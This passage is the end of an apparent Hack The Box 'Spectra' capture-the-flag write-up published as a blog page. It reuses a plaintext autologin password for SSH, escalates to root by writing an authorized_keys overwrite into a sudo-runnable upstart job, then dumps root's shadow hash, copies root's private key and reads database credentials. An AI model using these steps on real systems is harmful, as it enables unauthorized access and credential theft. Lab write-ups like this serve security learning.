+    if [ -e &quot;${dir}/passwd&quot; ]; then
+      passwd=&quot;$(cat &quot;${dir}/passwd&quot;)&quot;
+      break
+    fi
+  done
+  if [ -z &quot;${passwd}&quot; ]; then
+    exit 0
+  fi
+  # Inject keys into the login prompt.
+  #
+  # For this to work, you must have already created an account on the device.
+  # Otherwise, no login prompt appears at boot and the injected keys do the
+  # wrong thing.
+  /usr/local/sbin/inject-keys.py -s &quot;${passwd}&quot; -k enter
+end script</span></span></span></code></pre></li><li id="https://www.notion.so/2f05b46ac1434f65a7f45e1b481b5ccd" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">In particular, this line stands out:</span></span><pre id="https://www.notion.so/13943ee4397244eeac8513a70624266b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span># Read password from file. The file may optionally end with a newline.
+for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do</span></span></span></code></pre></li><li id="https://www.notion.so/75710a914afe4f0ba748ae9faebd08c8" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Looking at the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/autologin/</code></span><span class="SemanticString"> directory, we find a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">passwd</code></span><span class="SemanticString"> file:</span></span><div id="https://www.notion.so/82357b0aa154433c8d70538028a1db35" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cat /etc/autologin/passwd</code></span></span></p></div><pre id="https://www.notion.so/6ce70df4a4a043e1a6e78328f7176757" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>SummerHereWeCome!!</span></span></span></code></pre></li><li id="https://www.notion.so/ec8ba8f55fb74a038c35e3c4e428e645" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Seeing as Katie is the only human user on the machine and other system accounts likely won&#x27;t require autologin, let&#x27;s try to SSH in as katie:</span></span><div id="https://www.notion.so/5769b5ba29a5481e8fb20874229510a3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ssh katie@spectra.htb</code></span></span></p></div></li><li id="https://www.notion.so/11623176ffe24a18bc78b478ab945d79" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Successfully logged in as katie:</span></span><div id="https://www.notion.so/0ffd37365216453b8504901f37622c3a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami &amp;&amp; id</code></span></span></p></div><pre id="https://www.notion.so/86deeebdcf3140d29b2d77e9c10de3f4" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>katie
+uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)</span></span></span></code></pre></li><li id="https://www.notion.so/59e24897331d44e6adb5c197d1532e76" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get user flag!</span></span></li></ul><h2 id="https://www.notion.so/29689bdf4f3445489d0622cf8dbd071a" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/29689bdf4f3445489d0622cf8dbd071a"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/f8867d585ebe4d1b9a7668fcf90f7cad" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Checking sudo privileges:</span></span><div id="https://www.notion.so/442ed934c5ad498294afd345e40b9bb1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo -l</code></span></span></p></div><pre id="https://www.notion.so/67094572b8594e96bd5d4a46d05d274f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>User katie may run the following commands on spectra:
+    (ALL) SETENV: NOPASSWD: /sbin/initctl</span></span></span></code></pre></li><li id="https://www.notion.so/b4f5860ddda842df8606ec638a294b0d" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Katie can run </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/sbin/initctl</code></span><span class="SemanticString"> with sudo privileges, which is an init daemon control tool used for interacting with upstart processes.</span></span></li><li id="https://www.notion.so/e9e915ffcdc64e2e93703e3d0f6df46f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">To demonstrate, we can get a list of all known jobs with the command:</span></span><div id="https://www.notion.so/fa5b5d9a30b04b1fa92b297e8e42501c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo /sbin/initctl list</code></span></span></p></div><pre id="https://www.notion.so/a7cbb0a259bf4300ada43e940c30980b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>...
+syslog start/running, process 652
+udev-trigger-early stop/waiting
+test3 stop/waiting
+dlm-suspend stop/waiting</span></span></span></code></pre></li><li id="https://www.notion.so/297d05c14d714664bb43961c51d863ba" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">The upstart scripts can be found in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/init/</code></span><span class="SemanticString"> diredctory with a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.conf</code></span><span class="SemanticString"> extension.</span></span></li><li id="https://www.notion.so/09e5e87c89a246fabbc56a282160f04e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Finding scripts read and writable by katie:</span></span><div id="https://www.notion.so/140c7dc3dd194be3bc96e91b48991fa8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ find /etc/init/ -perm -660</code></span></span></p></div><pre id="https://www.notion.so/397820ffe1dc4064b7721b75d984f751" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>./test6.conf
+./test7.conf
+./test3.conf
+./test4.conf
+./test.conf
+./test8.conf
+./test9.conf
+./test10.conf
+./test2.conf
+./test5.conf
+./test1.conf
+./openssh-server.conf</span></span></span></code></pre></li><li id="https://www.notion.so/d1130486a28648f28af3389f66f70b32" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">The test.conf scripts are all identical, looking at </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">test.conf</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/9d5a9c9a246446809f86deba0e0c4a6a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>description &quot;Test node.js server&quot;
+author      &quot;katie&quot;
+
+start on filesystem or runlevel [2345]
+stop on shutdown
+
+script
+
+    export HOME=&quot;/srv&quot;
+    echo $$ &gt; /var/run/nodetest.pid
+    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
+
+end script
+
+pre-start script
+    echo &quot;[`date`] Node Test Starting&quot; &gt;&gt; /var/log/nodetest.log
+end script
+
+pre-stop script
+    rm /var/run/nodetest.pid
+    echo &quot;[`date`] Node Test Stopping&quot; &gt;&gt; /var/log/nodetest.log
+end script</span></span></span></code></pre></li><li id="https://www.notion.so/f9f01a850a0048df991621953f71b0f2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We can add the following line within the script block, which will add our public key to the root&#x27;s SSH </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">authorized_keys</code></span><span class="SemanticString"> file:</span></span><div id="https://www.notion.so/1bc704ee70da4993a0e64624dc6dc72f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">echo &quot;&lt;id_rsa.pub&gt;&quot; &gt; /root/.ssh/authorized_keys</code></span></span></p></div></li><li id="https://www.notion.so/100586e1ba7d4f96ab5b5bdcb6d66192" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Start the job with sudo privileges:</span></span><div id="https://www.notion.so/8a175f3c58444c7b97268c6af7e7af2f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo /sbin/initctl start test</code></span></span></p></div></li><li id="https://www.notion.so/c7dddb9a38c945ceb8dd5acb9bb8184a" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Using our matching private key, SSH in as root:</span></span><div id="https://www.notion.so/aae9f26fe2bd44c1b9c6f10516cccec4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ssh root@spectra.htb -i ~/.ssh/id_rsa</code></span></span></p></div></li><li id="https://www.notion.so/5d4e30e4589440248704b324e4564753" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">And we&#x27;re in as root!</span></span><div id="https://www.notion.so/9a13ec5fb9c14cd18cf148c0583d371d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami &amp;&amp; id</code></span></span></p></div><pre id="https://www.notion.so/0d76a09c61b74af0a9d2686089e73983" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),26(tape),27(video),207(tss),208(pkcs11),219(wpa),253(preserve),1001(chronos-access)</span></span></span></code></pre></li><li id="https://www.notion.so/26aab470bcb049e6a596e8260926e8f1" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get root flag!</span></span></li></ul><h2 id="https://www.notion.so/82073aa6080c4e4ea0d05fa2c6834940" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/82073aa6080c4e4ea0d05fa2c6834940"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Persistence</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/558aa3e222c44056bd7bcc74a01e7dc8" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Get root user&#x27;s hash from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/shadow</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/f662a0c2eecf4ced85196fd1e906ca20" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root:$1$lchcuPsn$BgyskySIi0hFMF4/v7S53.:18661::::::</span></span></span></code></pre></li><li id="https://www.notion.so/4139addeca214ab9935e62db23904491" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Maintaining access by getting root&#x27;s private SSH key from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/root/.ssh/id_rsa</code></span><span class="SemanticString">:</span></span><div id="https://www.notion.so/e4fe2e100aaa42d0bad7192c33c03673" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ scp root@spectra.htb:/root/.ssh/id_rsa .</code></span></span></p></div></li><li id="https://www.notion.so/f7cca7cacc5c47a397954551f8b0f2b4" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">We also find the MySQL database credentials for the production branch in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/root/main/wp-config.php:</code></span></span><pre id="https://www.notion.so/d6f52eab45e8406eaa8b68697d7a0275" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment">/** MySQL database username */</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_USER'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dev'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/** MySQL database password */</span>
+<span class="token function">define</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'DB_PASSWORD'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'development01'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></span></code></pre></li><li id="https://www.notion.so/8784a0478f9b4e9f888e404180d7297f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Clean up after ourselves:</span></span><div id="https://www.notion.so/8418cf709d954e3b9800b109b62bf67d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ rm /dev/shm/upgrade.sh</code></span></span></p></div></li></ul><h2 id="https://www.notion.so/b519d11209614c6c949caba38e3eacd2" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/b519d11209614c6c949caba38e3eacd2"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Resources</span></span></h2><ol class="NumberedListWrapper"><li id="https://www.notion.so/45193b427fcf40e78f6ec502c479330c" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://manpages.ubuntu.com/manpages/trusty/man8/initctl.8.html">http://manpages.ubuntu.com/manpages/trusty/man8/initctl.8.html</a></span></span></li><li id="https://www.notion.so/833ce2a583b74ec0806abd4b3ee5e639" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://blog.joshsoftware.com/2012/02/14/upstart-scripts-in-ubuntu/">https://blog.joshsoftware.com/2012/02/14/upstart-scripts-in-ubuntu/</a></span></span></li></ol></article>
+  <footer class="Footer">
+  <div>samiko@127.0.0.1~$</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank" rel="noopener noreferrer">Notablog</a>.</div>
+</footer>
+</body>
+
+</html>
